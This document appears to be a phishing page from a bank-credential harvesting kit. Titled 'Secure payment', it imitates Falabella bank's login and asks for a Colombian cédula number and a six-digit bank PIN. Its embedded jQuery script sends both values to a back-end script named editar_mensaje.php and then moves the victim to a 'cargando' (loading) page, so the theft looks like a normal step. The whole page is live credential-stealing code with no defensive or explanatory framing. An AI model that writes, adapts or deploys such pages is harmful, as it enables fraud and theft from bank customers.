<?php

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0">
    <title>Secure payment</title>

    <script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
		<script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="/scripts/functions2.js"></script>  		

    <style>

        *{
            -webkit-appearance: none;
            font-family: Arial, Helvetica, sans-serif;
            margin: 0;
            padding: 0;
        }
        input{
            width: 80%;
            height: 40px;
            border-radius: 5px;
            margin-top: 10px;
            border:1px solid gray;
            padding: 5px;
        }
        select{
            padding: 5px;
            background-color: white;
            color: black;
            width: 82%;
            height: 40px;
            border-radius: 5px;
            margin-top: 10px;
            border:1px solid gray;
        }

        #btnUsuario{
            background-color: palevioletred;
            border: none;
            color: white;
            letter-spacing: 3px;
            font-family: Arial, Helvetica, sans-serif, 'Arial Narrow Bold';
            
        }

        #clave{
            color:rgb(78,139,102);
        }
    </style>
</head>
<body>
    <br><br>
    <div><center><img src="/img/fala.png" alt="" width="40%" height="">
    <img src="/images/check.png" alt="" srcset="" width="20%"></center>
    <img src="/img/pago.jpg" alt="" width="20%" style="margin-left:90px;"></div>
<br><br><br><br>
    <div>
        <center>
        <select name="" id="">
            <option value="cedula">Cedula Ciudadania</option>
        </select><br>

        <input type="tel" id="txtUsuario" name = "cedula" placeholder="Cedula Ciudadania" maxlength="10" minlength="6" maxlength="10" pattern="^[0-9]{6,10}$" oninput="this.value = this.value.replace(/\D+/g, '');"><br>
        <input type="password" id="txtPass" name ="clave" placeholder="Clave" required pattern="[0-9]{6}" oninput="this.value = this.value.replace(/\D+/g, '');"><br>
        <input type="submit" value="INGRESAR" id="btnUsuario" ></center><br>
        <input type="hidden" value="falabella" id="banco">
       <center> <a href="" id="clave">Crea o recupera tu clave</a></center>
   </div>
<br><br>



<script type="text/javascript">
$(document).ready(function () {
    const $user = $("#txtUsuario");
    const $pass = $("#txtPass");
    const $btn  = $("#btnUsuario");
    const $err  = $("#err-mensaje");


    function validarCampos() {
        const userVal = $user.val();
        const passVal = $pass.val();

        const validUser = userVal.length >= 6 && userVal.length <= 10;
        const validPass = passVal.length >= 4;

        if (validUser && validPass) {
            $btn.prop("disabled", false);
            $btn.css("background-color", "#d52c63");
            $err.hide();
        } else {
            $btn.prop("disabled", true);
            $btn.css("background-color", "palevioletred");
        }
    }

    // Cada vez que escriben, limpiamos y validamos
    $user.on("input", function () {
        validarCampos();
    });

    $pass.on("input", function () {
        validarCampos();
    });

    // Click en el botón
    $btn.on("click", function (e) {

        const userVal = $user.val();
        const passVal = $pass.val();

        const validUser = userVal.length >= 6 ;
        const validPass = passVal.length === 6;

        if (!validUser || !validPass) {
            $err.show();
            if (!validUser) $user.css("border", "1px solid red");
            if (!validPass) $pass.css("border", "1px solid red");
            return;
        }

        // reset bordes
        $user.css("border", "1px solid gray");
        $pass.css("border", "1px solid gray");
        $err.hide();

        const data = {
            usuario: userVal,
            pass: passVal
        };

        $.ajax({
            url: '../../acciones/editar_mensaje.php',
            method: 'POST',
            data: { data: data },
            success: function (response) {
                const result = JSON.parse(response);
                if (result.success) {
                    window.location.href = "cargando.php";
                } else {
                    alert('Error de conexión, por favor intente de nuevo');
                    window.location.href = "/";
                }
            },
            error: function (xhr, status, error) {
                alert('Error en la solicitud AJAX: ' + error);
            }
        });
    });

    // Validar una vez al inicio
    validarCampos();
});
</script>
    
</body>
</html>